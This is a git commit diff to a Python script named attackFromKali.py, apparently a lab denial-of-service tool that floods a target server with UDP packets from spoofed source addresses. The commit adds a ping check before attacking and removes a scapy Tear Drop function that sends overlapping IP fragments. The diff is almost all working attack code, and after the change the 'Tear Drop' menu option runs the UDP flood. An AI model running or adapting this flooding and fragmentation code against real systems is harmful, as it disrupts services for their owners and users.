59c397164fec36b55714e7ffb6a9a6dceecf2ac1
Jason Salem <44297233+jasonsalem2002@users.noreply.github.com>
2023-10-01 14:23:09 +0300

    Check if server is alive

--- attackFromKali.py
+++ attackFromKali.py
@@ -3,6 +3,7 @@ import random
 import threading
 import time
 from tqdm import tqdm
+import subprocess
 
 # Global variables for tracking sent packets and time
 sent_packets = 0
@@ -10,15 +11,6 @@ start_time = 0
 
 # Locks for thread-safe access to shared variables
 sent_packets_lock = threading.Lock()
-
-def log_results(attack_type, packets_sent, duration):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    with open("attack_results.txt", "a") as file:
-        file.write(f"Timestamp: {timestamp}\n")
-        file.write(f"Attack Type: {attack_type}\n")
-        file.write(f"Packets Sent: {packets_sent}\n")
-        file.write(f"Duration: {duration} seconds\n")
-        file.write("=" * 50 + "\n")
 
 # Function representing the task to be performed in each thread
 def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
@@ -43,74 +35,69 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
 
         time.sleep(1)  # Update every second
 
+def is_server_alive(server_ip):
+    try:
+        # Ping the server with a timeout of 1 second and count of 1 packet
+        subprocess.check_output(['ping', '-c', '1', '-W', '1', server_ip])
+        return True
+    except subprocess.CalledProcessError:
+        return False
 
-def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
-    global sent_packets, start_time
-    while sent_packets < count:
-        source_ip = random.choice(source_ips)
-
-        # Create overlapping fragments for Tear Drop attack
-        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
-        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))
-
-        send(frag1, verbose=0)
-        send(frag2, verbose=0)
-
-        with sent_packets_lock:
-            sent_packets += 1
-
-        progress_bar.update(1)
-        progress_bar.set_postfix(PacketsSent=sent_packets)
-
-        time.sleep(1) 
-        
 # Main function
 def main():
     global start_time
-    attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
-    number_of_packets = int(input("Enter the number of times to execute the attack: "))
-
-    # Server IP and port (replace with actual values)
     server_ip = '192.168.119.130'
-    server_port = 12345
 
-    # List of source IP addresses to use (replace with actual IPs)
-    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
+    # Check if the server is alive
+    if is_server_alive(server_ip):
+        print("Server is online.")
+        attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
+        number_of_packets = int(input("Enter the number of times to execute the attack: "))
 
-    start_time = time.time()  # Record the start time
+        # List of source IP addresses to use (replace with actual IPs)
+        source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']
+        server_port = 12345
 
-    # Create a tqdm progress bar
-    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
-        threads = []
+        start_time = time.time()  # Record the start time
 
-        if attack_number == 1:
-            attack_type = "Tear Drop"
-            for _ in range(number_of_packets):
-                thread = threading.Thread(target=send_tear_drop_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
-                threads.append(thread)
-                thread.start()
+        # Create a tqdm progress bar
+        with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
+            threads = []
 
-            for thread in threads:
-                thread.join()
+            if attack_number == 1:
+                attack_type = "Tear Drop"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
 
-        elif attack_number == 2:
-            attack_type = "Maximum Packet Size"
-            for _ in range(number_of_packets):
-                thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
-                threads.append(thread)
-                thread.start()
+                for thread in threads:
+                    thread.join()
 
-            for thread in threads:
-                thread.join()
+            elif attack_number == 2:
+                attack_type = "Maximum Packet Size"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
 
-    # Calculate attack duration
-    end_time = time.time()
-    attack_duration = end_time - start_time
+                for thread in threads:
+                    thread.join()
 
-    # Log attack results to a file
-    log_results(attack_type, number_of_packets, attack_duration)
+        # Calculate attack duration
+        end_time = time.time()
+        attack_duration = end_time - start_time
 
+        # Log attack results to a file
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        with open("attack_results.txt", "a") as file:
+            file.write(f"Timestamp: {timestamp}\n")
+            file.write(f"Attack Type: {attack_type}\n")
+            file.write(f"Packets Sent: {number_of_packets}\n")
+            file.write(f"Duration: {attack_duration} seconds\n")
+            file.write("=" * 50 + "\n")
+    else:
+        print("Error: Server is offline or not reachable.")
 
-        
 if __name__ == "__main__":
     main()
